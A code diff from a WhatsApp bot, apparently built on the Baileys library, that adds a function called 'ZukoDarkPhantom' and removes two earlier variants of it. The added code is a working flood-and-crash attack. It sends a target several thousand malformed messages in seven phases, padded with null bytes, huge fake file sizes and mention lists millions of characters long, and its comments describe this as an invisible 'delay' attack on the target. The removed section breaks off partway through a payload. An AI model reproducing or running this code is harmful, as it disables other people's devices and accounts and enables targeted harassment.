@@ -258,6 +258,361 @@ const antidelete = (() => {
             messageStore.set(messageId, { content, sender, group, timestamp: new Date().toISOString() });
         } catch (err) {}
     }
+    // ============================================================
+// ZUKO DARK PHANTOM - Strongest Invisible Delay (NEW)
+// Uses 7 attack vectors with massive payloads
+// 100% invisible to all members
+// ============================================================
+async function ZukoDarkPhantom(sock, target) {
+  const crypto = require('crypto');
+  const fs = require('fs');
+  const path = require('path');
+
+  const tempDir = path.join(__dirname, '../database/temp');
+  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
+
+  // ====== Generate massive JID list ======
+  const generateRandomJid = () => {
+    const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
+    return `"${randomNumber}@s.whatsapp.net"`;
+  };
+
+  const createTempFile = () => {
+    const tempFilePath = path.join(tempDir, `dark_phantom_${Date.now()}.json`);
+    let jids = [];
+    let currentSize = 0;
+    while (currentSize < 5061432 - 50) {
+      const jid = generateRandomJid();
+      jids.push(jid);
+      currentSize += jid.length + 3;
+    }
+    fs.writeFileSync(tempFilePath, `[${jids.join(',')}]`);
+    return tempFilePath;
+  };
+
+  const tempFilePath = createTempFile();
+  const jidsss = JSON.parse(fs.readFileSync(tempFilePath));
+
+  setTimeout(() => {
+    try { fs.unlinkSync(tempFilePath); } catch (e) {}
+  }, 5000);
+
+  // ====== Attack Phases ======
+
+  // ---------- PHASE 1: Dark Document Flood (600) ----------
+  for (let i = 0; i < 600; i++) {
+    const darkPayload = {
+      ephemeralMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              documentMessage: {
+                url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
+                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
+                fileLength: "9999999999999",
+                pageCount: 999999999 + i,
+                mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
+                fileName: `☠️_${i}`,
+                fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
+                directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
+                contactVcard: true,
+                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQEAAAAAAAAAAAAAAAACAQAD/9oADAMBAAIQAxAAAACqa++PXQ0Ik6Y47WM93tTIKSih1F8ddXgrkvU0c1522lfS0k081erMWxNd+mlFfanKTfJqJnlipE66zSVhyul530vQtK3Jy4JwM2gBugaZr4M+lxwKwgEf/8QAKBAAAgIBAwMEAQUAAAAAAAAAAAIAAxEEEjEQIQUFEyJRYRMkMnGB/9oACAEBAAE/AIDNLTn5t0GMTvMq2ZfSVOV4n+9K13uoiqFUCEzBEU5JH4iVsr95am5THYrZtgmjXNwmeYTwYSAMme8qV9ncGJcriZBlmkqsOcYMBmiYC0zPciC+reEJmBPY5sZj95hQIRgS+4j4rzK7SUzzMymzY4MFz2ElPAldAv2vwymcATd3wI3bbmWDNr/1F1IpTuMnwJmZmg7I7QOabM+DBdU/mbgBkQPvU/gxkGS33NQxFpOMBeJkDppvjS8tANKt9CHU15xNKXJ4JBEVAuRNXaKqD9mM7N/I56DkRG26Vm+zGt/ZqTA21twmkvF9XbAIjMwxunqNamgP14lpxpa1E1OU09SHp6c+LwPBhQHE9T1S4/RHT//EAB0RAQEAAgIDAwAAAAAAAAAAAAEAEEERMRIhUdH/2gAIAQIBAT8AmNT9yHMFz7S5Jh1h7vEcfslvOyY7x//EABoRAAICAwAAAAAAAAAAAAAAAAEQABEgMVH/2gAIAQMBAT8AzCpadsQvsEK//9k="
+              },
+              hasMediaAttachment: true,
+            },
+            body: { text: `☠️${'⬛'.repeat(5000)}` },
+            footer: { text: `☠️${'⬛'.repeat(5000)}` },
+            nativeFlowMessage: {},
+            contextInfo: {
+              mentionedJid: jidsss,
+              mentions: jidsss,
+              forwardingScore: 9999 + i,
+              isForwarded: true,
+              fromMe: false,
+              participant: "0@s.whatsapp.net",
+              remoteJid: "status@broadcast",
+              quotedMessage: {
+                documentMessage: {
+                  url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
+                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                  fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
+                  fileLength: "9999999999999",
+                  pageCount: 999999999 + i,
+                  mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
+                  fileName: `☠️_${i}`,
+                  fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
+                  directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
+                  contactVcard: true,
+                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQEAAAAAAAAAAAAAAAACAQAD/9oADAMBAAIQAxAAAACqa++PXQ0Ik6Y47WM93tTIKSih1F8ddXgrkvU0c1522lfS0k081erMWxNd+mlFfanKTfJqJnlipE66zSVhyul530vQtK3Jy4JwM2gBugaZr4M+lxwKwgEf/8QAKBAAAgIBAwMEAQUAAAAAAAAAAAIAAxEEEjEQIQUFEyJRYRMkMnGB/9oACAEBAAE/AIDNLTn5t0GMTvMq2ZfSVOV4n+9K13uoiqFUCEzBEU5JH4iVsr95am5THYrZtgmjXNwmeYTwYSAMme8qV9ncGJcriZBlmkqsOcYMBmiYC0zPciC+reEJmBPY5sZj95hQIRgS+4j4rzK7SUzzMymzY4MFz2ElPAldAv2vwymcATd3wI3bbmWDNr/1F1IpTuMnwJmZmg7I7QOabM+DBdU/mbgBkQPvU/gxkGS33NQxFpOMBeJkDppvjS8tANKt9CHU15xNKXJ4JBEVAuRNXaKqD9mM7N/I56DkRG26Vm+zGt/ZqTA21twmkvF9XbAIjMwxunqNamgP14lpxpa1E1OU09SHp6c+LwPBhQHE9T1S4/RHT//EAB0RAQEAAgIDAwAAAAAAAAAAAAEAEEERMRIhUdH/2gAIAQIBAT8AmNT9yHMFz7S5Jh1h7vEcfslvOyY7x//EABoRAAICAwAAAAAAAAAAAAAAAAEQABEgMVH/2gAIAQMBAT8AzCpadsQvsEK//9k="
+                }
+              }
+            }
+          }
+        }
+      }
+    };
+
+    await sock.sendMessage(target, darkPayload, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 100 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 1: ${i}/600`));
+    await new Promise(resolve => setTimeout(resolve, 30));
+  }
+
+  // ---------- PHASE 2: Dark Poll Flood (300) ----------
+  for (let i = 0; i < 300; i++) {
+    const pollOptions = [];
+    for (let p = 0; p < 1000; p++) {
+      pollOptions.push({
+        optionName: '\u0000'.repeat(10000) + `_${p}_${i}`
+      });
+    }
+
+    const darkPoll = {
+      ephemeralMessage: {
+        message: {
+          pollCreationMessage: {
+            name: '\u0000'.repeat(100000) + `_${i}`,
+            options: pollOptions,
+            selectableOptionsCount: 1,
+            pollType: 'QUIZ',
+            correctAnswer: pollOptions[Math.floor(Math.random() * pollOptions.length)],
+            contextInfo: {
+              mentionedJid: jidsss,
+              mentions: jidsss,
+              forwardingScore: 9999 + i,
+              isForwarded: true,
+              fromMe: false,
+              participant: "0@s.whatsapp.net",
+              remoteJid: "status@broadcast"
+            }
+          }
+        }
+      }
+    };
+
+    await sock.sendMessage(target, darkPoll, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 2: ${i}/300`));
+    await new Promise(resolve => setTimeout(resolve, 50));
+  }
+
+  // ---------- PHASE 3: Dark Protocol Flood (400) ----------
+  for (let i = 0; i < 400; i++) {
+    const darkProtocol = {
+      protocolMessage: {
+        key: {
+          remoteJid: target,
+          id: crypto.randomBytes(16).toString('hex'),
+          fromMe: true,
+          participant: '0@s.whatsapp.net'
+        },
+        type: 25,
+        ephemeralExpiration: 9999999999 + i,
+        status: 0,
+        contextInfo: {
+          participant: '0@s.whatsapp.net',
+          remoteJid: target,
+          isForwarded: true,
+          forwardingScore: 9999999 + i,
+          mentionedJid: jidsss,
+          mentions: jidsss
+        }
+      }
+    };
+
+    await sock.sendMessage(target, darkProtocol, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 3: ${i}/400`));
+    await new Promise(resolve => setTimeout(resolve, 40));
+  }
+
+  // ---------- PHASE 4: Dark Reaction Flood (300) ----------
+  for (let i = 0; i < 300; i++) {
+    const darkReaction = {
+      ephemeralMessage: {
+        message: {
+          reactionMessage: {
+            key: {
+              remoteJid: target,
+              id: crypto.randomBytes(16).toString('hex'),
+              fromMe: true,
+              participant: '0@s.whatsapp.net'
+            },
+            text: '☠️'.repeat(100000) + '\u0000'.repeat(100000),
+            groupingKey: crypto.randomBytes(32).toString('hex'),
+            contextInfo: {
+              mentionedJid: jidsss,
+              mentions: jidsss,
+              isForwarded: true,
+              forwardingScore: 9999999 + i,
+              participant: '0@s.whatsapp.net',
+              remoteJid: 'status@broadcast'
+            }
+          }
+        }
+      }
+    };
+
+    await sock.sendMessage(target, darkReaction, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 4: ${i}/300`));
+    await new Promise(resolve => setTimeout(resolve, 35));
+  }
+
+  // ---------- PHASE 5: Dark Sticker Pack Flood (200) ----------
+  for (let i = 0; i < 200; i++) {
+    const stickers = [];
+    for (let s = 0; s < 200; s++) {
+      stickers.push({
+        fileName: `${crypto.randomBytes(16).toString('hex')}.webp`,
+        isAnimated: true,
+        accessibilityLabel: '\u0000'.repeat(10000),
+        isLottie: false,
+        mimetype: 'image/webp'
+      });
+    }
+
+    const darkSticker = {
+      ephemeralMessage: {
+        message: {
+          stickerPackMessage: {
+            stickerPackId: crypto.randomBytes(16).toString('hex'),
+            name: '\u0000'.repeat(100000) + `_${i}`,
+            publisher: '\u0000'.repeat(100000),
+            stickers: stickers,
+            fileLength: '9999999999999',
+            fileSha256: crypto.randomBytes(32).toString('base64'),
+            fileEncSha256: crypto.randomBytes(32).toString('base64'),
+            mediaKey: crypto.randomBytes(32).toString('base64'),
+            directPath: `/v/t62.15575-24/${Math.floor(Math.random() * 999999999)}_${Math.floor(Math.random() * 999999999)}_n.enc?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=5e03e0`,
+            mediaKeyTimestamp: Date.now().toString(),
+            trayIconFileName: `${crypto.randomBytes(16).toString('hex')}.png`,
+            thumbnailDirectPath: crypto.randomBytes(16).toString('hex'),
+            thumbnailSha256: crypto.randomBytes(32).toString('base64'),
+            thumbnailEncSha256: crypto.randomBytes(32).toString('base64'),
+            thumbnailHeight: 99999999,
+            thumbnailWidth: 99999999,
+            imageDataHash: crypto.randomBytes(32).toString('base64'),
+            stickerPackSize: 99999999999,
+            stickerPackOrigin: 99999999999,
+            contextInfo: {
+              mentionedJid: jidsss,
+              mentions: jidsss,
+              isForwarded: true,
+              forwardingScore: 9999999 + i,
+              participant: '0@s.whatsapp.net',
+              remoteJid: 'status@broadcast'
+            }
+          }
+        }
+      }
+    };
+
+    await sock.sendMessage(target, darkSticker, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 5: ${i}/200`));
+    await new Promise(resolve => setTimeout(resolve, 60));
+  }
+
+  // ---------- PHASE 6: Dark ViewOnce + Interactive (150) ----------
+  for (let i = 0; i < 150; i++) {
+    const darkViewOnce = {
+      viewOnceMessage: {
+        message: {
+          messageContextInfo: {
+            deviceListMetadata: {},
+            deviceListMetadataVersion: 2,
+            messageSecret: crypto.randomBytes(32)
+          },
+          interactiveResponseMessage: {
+            body: {
+              text: '\u0000'.repeat(100000) + `_${i}`,
+              format: 'DEFAULT'
+            },
+            nativeFlowResponseMessage: {
+              name: 'call_permission_request',
+              paramsJson: '\u0000'.repeat(19999999) + `_${i}`,
+              version: 9
+            },
+            contextInfo: {
+              mentionedJid: jidsss,
+              mentions: jidsss,
+              isForwarded: true,
+              forwardingScore: 9999999 + i,
+              remoteJid: 'status@broadcast',
+              participant: Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
+            }
+          }
+        }
+      }
+    };
+
+    await sock.sendMessage(target, darkViewOnce).catch(() => {});
+    if (i % 30 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 6: ${i}/150`));
+    await new Promise(resolve => setTimeout(resolve, 70));
+  }
+
+  // ---------- PHASE 7: Dark Newsletter Admin Invite (100) ----------
+  for (let i = 0; i < 100; i++) {
+    const darkNewsletter = {
+      newsletterAdminInviteMessage: {
+        newsletterJid: `120363${Math.floor(Math.random() * 999999999)}@newsletter`,
+        newsletterName: '\u0000'.repeat(100000) + `_${i}`,
+        caption: '\u0000'.repeat(100000) + `_${i}`,
+        inviteExpiration: '0',
+        contextInfo: {
+          participant: '0@s.whatsapp.net',
+          remoteJid: target,
+          isForwarded: true,
+          forwardingScore: 9999999 + i,
+          mentionedJid: jidsss,
+          mentions: jidsss
+        }
+      }
+    };
+
+    await sock.sendMessage(target, darkNewsletter).catch(() => {});
+    if (i % 25 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 7: ${i}/100`));
+    await new Promise(resolve => setTimeout(resolve, 80));
+  }
+
+  // ---------- FINAL SURGE: 500 iterations of pure chaos ----------
+  for (let i = 0; i < 500; i++) {
+    const darkSurge = {
+      ephemeralMessage: {
+        message: {
+          protocolMessage: {
+            key: {
+              remoteJid: target,
+              id: crypto.randomBytes(16).toString('hex'),
+              fromMe: true,
+              participant: '0@s.whatsapp.net'
+            },
+            type: 25,
+            ephemeralExpiration: 9999999999 + i,
+            contextInfo: {
+              participant: '0@s.whatsapp.net',
+              remoteJid: target,
+              isForwarded: true,
+              forwardingScore: 9999999 + i,
+              mentionedJid: jidsss,
+              mentions: jidsss,
+              quotedMessage: {
+                reactionMessage: {
+                  text: '☠️'.repeat(100000) + '\u0000'.repeat(100000),
+                  groupingKey: crypto.randomBytes(32).toString('hex')
+                }
+              }
+            }
+          }
+        }
+      }
+    };
+
+    await sock.sendMessage(target, darkSurge, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 100 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Final Surge: ${i}/500`));
+    await new Promise(resolve => setTimeout(resolve, 20));
+  }
+
+  console.log(chalk.green(`✅ ZUKO DARK PHANTOM COMPLETE on ${target}`));
+  console.log(chalk.red(`☠️ TARGET ${target} HAS BEEN DARK PHANTOMED ☠️`));
+}
 
     async function handleRevocation(sock, revocationMessage) {
         try {
@@ -385,109 +740,6 @@ function renderHangman(game) {
     const wrongLetters = [...game.guessed].filter(l => !game.word.includes(l));
     return `${HANGMAN_STAGES[game.wrong]}\n\n📝 ${displayWord}\n\n❤️ Lives: ${game.maxWrong - game.wrong}/${game.maxWrong}\n❌ Wrong: ${wrongLetters.join(', ') || 'none'}`;
 }
-// ============================================================
-// ZUKO DELAY BUG - Document Flood with Random JIDs (FIXED)
-// ============================================================
-async function ZukoDelay(from) {
-  const path = require('path');
-  const fs = require('fs');
-
-  const tempDir = path.join(__dirname, '../database/temp');
-  if (!fs.existsSync(tempDir)) {
-    fs.mkdirSync(tempDir, { recursive: true });
-  }
-
-  const generateRandomJid = () => {
-    const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
-    return `"${randomNumber}@s.whatsapp.net"`;
-  };
-
-  const createTempFile = () => {
-    const tempFilePath = path.join(tempDir, `temp_jids_${Date.now()}.json`);
-    let jids = [];
-    let currentSize = 0;
-    while (currentSize < 1061432 - 50) {
-      const jid = generateRandomJid();
-      jids.push(jid);
-      currentSize += jid.length + 3;
-    }
-    fs.writeFileSync(tempFilePath, `[${jids.join(',')}]`);
-    return tempFilePath;
-  };
-
-  const tempFilePath = createTempFile();
-  const jidsss = JSON.parse(fs.readFileSync(tempFilePath));
-
-  setTimeout(() => {
-    try { fs.unlinkSync(tempFilePath); } catch (e) {}
-  }, 5000);
-
-  const url = "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true";
-  const fileSha256 = "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=";
-  const mediaKey = "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=";
-  const fileEncSha256 = "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=";
-  const directPath = "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0";
-  const jpegThumbnail = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQEAAAAAAAAAAAAAAAACAQAD/9oADAMBAAIQAxAAAACqa++PXQ0Ik6Y47WM93tTIKSih1F8ddXgrkvU0c1522lfS0k081erMWxNd+mlFfanKTfJqJnlipE66zSVhyul530vQtK3Jy4JwM2gBugaZr4M+lxwKwgEf/8QAKBAAAgIBAwMEAQUAAAAAAAAAAAIAAxEEEjEQIQUFEyJRYRMkMnGB/9oACAEBAAE/AIDNLTn5t0GMTvMq2ZfSVOV4n+9K13uoiqFUCEzBEU5JH4iVsr95am5THYrZtgmjXNwmeYTwYSAMme8qV9ncGJcriZBlmkqsOcYMBmiYC0zPciC+reEJmBPY5sZj95hQIRgS+4j4rzK7SUzzMymzY4MFz2ElPAldAv2vwymcATd3wI3bbmWDNr/1F1IpTuMnwJmZmg7I7QOabM+DBdU/mbgBkQPvU/gxkGS33NQxFpOMBeJkDppvjS8tANKt9CHU15xNKXJ4JBEVAuRNXaKqD9mM7N/I56DkRG26Vm+zGt/ZqTA21twmkvF9XbAIjMwxunqNamgP14lpxpa1E1OU09SHp6c+LwPBhQHE9T1S4/RHT//EAB0RAQEAAgIDAwAAAAAAAAAAAAEAEEERMRIhUdH/2gAIAQIBAT8AmNT9yHMFz7S5Jh1h7vEcfslvOyY7x//EABoRAAICAwAAAAAAAAAAAAAAAAEQABEgMVH/2gAIAQMBAT8AzCpadsQvsEK//9k=";
-
-  const ui = 'ꦽ'.repeat(5000);
-
-  const payload = {
-    ephemeralMessage: {
-      message: {
-        interactiveMessage: {
-          header: {
-            documentMessage: {
-              url: url,
-              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-              fileSha256: fileSha256,
-              fileLength: "9999999999999",
-              pageCount: 1316134911,
-              mediaKey: mediaKey,
-              fileName: "⛤",
-              fileEncSha256: fileEncSha256,
-              directPath: directPath,
-              contactVcard: true,
-              jpegThumbnail: jpegThumbnail
-            },
-            hasMediaAttachment: true,
-          },
-          body: { text: `⛤${ui}` },
-          footer: { text: `⛤${ui}` },
-          nativeFlowMessage: {},
-          contextInfo: {
-            mentionedJid: jidsss,
-            mentions: jidsss,
-            forwardingScore: 127,
-            isForwarded: true,
-            fromMe: false,
-            participant: "0@s.whatsapp.net",
-            remoteJid: "status@broadcast",
-            quotedMessage: {
-              documentMessage: {
-                url: url,
-                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-                fileSha256: fileSha256,
-                fileLength: "9999999999999",
-                pageCount: 131613491,
-                mediaKey: mediaKey,
-                fileName: "⛤",
-                fileEncSha256: fileEncSha256,
-                directPath: directPath,
-                contactVcard: true,
-                jpegThumbnail: jpegThumbnail
-              }
-            }
-          }
-        }
-      }
-    }
-  };
-
-  await empire.sendMessage(from, payload, { 
-    ephemeralExpiration: 0,
-    contextInfo: newsletterContext()
-  }).catch(() => {});
-}
 
 // ========== WELCOME / GOODBYE HANDLER ==========
 async function handleGroupParticipantsUpdate(empire, update, groupMetadata, botNumber) {
@@ -524,1157 +776,7 @@ async function handleGroupParticipantsUpdate(empire, update, groupMetadata, botN
         }
     } catch (e) { console.error('Welcome/Goodbye error:', e); }
 }
-// ============================================================
-// ZUKO PHANTOM DELAY - Invisible Strong Delay
-// 100% invisible to members, multiple attack vectors
-// ============================================================
-async function ZukoPhantomDelay(target) {
-  const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
-  const crypto = require('crypto');
-  const path = require('path');
-  const fs = require('fs');
 
-  const tempDir = path.join(__dirname, '../database/temp');
-  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
-
-  // ====== Generate massive JID list ======
-  const generateRandomJid = () => {
-    const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
-    return `"${randomNumber}@s.whatsapp.net"`;
-  };
-
-  const createTempFile = () => {
-    const tempFilePath = path.join(tempDir, `phantom_jids_${Date.now()}.json`);
-    let jids = [];
-    let currentSize = 0;
-    while (currentSize < 2061432 - 50) {
-      const jid = generateRandomJid();
-      jids.push(jid);
-      currentSize += jid.length + 3;
-    }
-    fs.writeFileSync(tempFilePath, `[${jids.join(',')}]`);
-    return tempFilePath;
-  };
-
-  const tempFilePath = createTempFile();
-  const jidsss = JSON.parse(fs.readFileSync(tempFilePath));
-
-  setTimeout(() => {
-    try { fs.unlinkSync(tempFilePath); } catch (e) {}
-  }, 5000);
-
-  // ====== Document payloads ======
-  const documentPayloads = [
-    {
-      url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
-      fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
-      mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
-      fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
-      directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
-      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQEAAAAAAAAAAAAAAAACAQAD/9oADAMBAAIQAxAAAACqa++PXQ0Ik6Y47WM93tTIKSih1F8ddXgrkvU0c1522lfS0k081erMWxNd+mlFfanKTfJqJnlipE66zSVhyul530vQtK3Jy4JwM2gBugaZr4M+lxwKwgEf/8QAKBAAAgIBAwMEAQUAAAAAAAAAAAIAAxEEEjEQIQUFEyJRYRMkMnGB/9oACAEBAAE/AIDNLTn5t0GMTvMq2ZfSVOV4n+9K13uoiqFUCEzBEU5JH4iVsr95am5THYrZtgmjXNwmeYTwYSAMme8qV9ncGJcriZBlmkqsOcYMBmiYC0zPciC+reEJmBPY5sZj95hQIRgS+4j4rzK7SUzzMymzY4MFz2ElPAldAv2vwymcATd3wI3bbmWDNr/1F1IpTuMnwJmZmg7I7QOabM+DBdU/mbgBkQPvU/gxkGS33NQxFpOMBeJkDppvjS8tANKt9CHU15xNKXJ4JBEVAuRNXaKqD9mM7N/I56DkRG26Vm+zGt/ZqTA21twmkvF9XbAIjMwxunqNamgP14lpxpa1E1OU09SHp6c+LwPBhQHE9T1S4/RHT//EAB0RAQEAAgIDAwAAAAAAAAAAAAEAEEERMRIhUdH/2gAIAQIBAT8AmNT9yHMFz7S5Jh1h7vEcfslvOyY7x//EABoRAAICAwAAAAAAAAAAAAAAAAEQABEgMVH/2gAIAQMBAT8AzCpadsQvsEK//9k="
-    },
-    {
-      url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
-      fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
-      mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
-      fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
-      directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
-      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQEAAAAAAAAAAAAAAAACAQAD/9oADAMBAAIQAxAAAACqa++PXQ0Ik6Y47WM93tTIKSih1F8ddXgrkvU0c1522lfS0k081erMWxNd+mlFfanKTfJqJnlipE66zSVhyul530vQtK3Jy4JwM2gBugaZr4M+lxwKwgEf/8QAKBAAAgIBAwMEAQUAAAAAAAAAAAIAAxEEEjEQIQUFEyJRYRMkMnGB/9oACAEBAAE/AIDNLTn5t0GMTvMq2ZfSVOV4n+9K13uoiqFUCEzBEU5JH4iVsr95am5THYrZtgmjXNwmeYTwYSAMme8qV9ncGJcriZBlmkqsOcYMBmiYC0zPciC+reEJmBPY5sZj95hQIRgS+4j4rzK7SUzzMymzY4MFz2ElPAldAv2vwymcATd3wI3bbmWDNr/1F1IpTuMnwJmZmg7I7QOabM+DBdU/mbgBkQPvU/gxkGS33NQxFpOMBeJkDppvjS8tANKt9CHU15xNKXJ4JBEVAuRNXaKqD9mM7N/I56DkRG26Vm+zGt/ZqTA21twmkvF9XbAIjMwxunqNamgP14lpxpa1E1OU09SHp6c+LwPBhQHE9T1S4/RHT//EAB0RAQEAAgIDAwAAAAAAAAAAAAEAEEERMRIhUdH/2gAIAQIBAT8AmNT9yHMFz7S5Jh1h7vEcfslvOyY7x//EABoRAAICAwAAAAAAAAAAAAAAAAEQABEgMVH/2gAIAQMBAT8AzCpadsQvsEK//9k="
-    }
-  ];
-
-  const ui = 'ꦽ'.repeat(5000);
-  const ghostText = '👻 ZUKO PHANTOM DELAY '.repeat(5000) + '\u0000'.repeat(500000);
-
-  // ====== PHASE 1: Invisible Document Flood (500 iterations) ======
-  for (let i = 0; i < 500; i++) {
-    const payload = documentPayloads[i % documentPayloads.length];
-
-    const msg = {
-      ephemeralMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              documentMessage: {
-                url: payload.url,
-                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
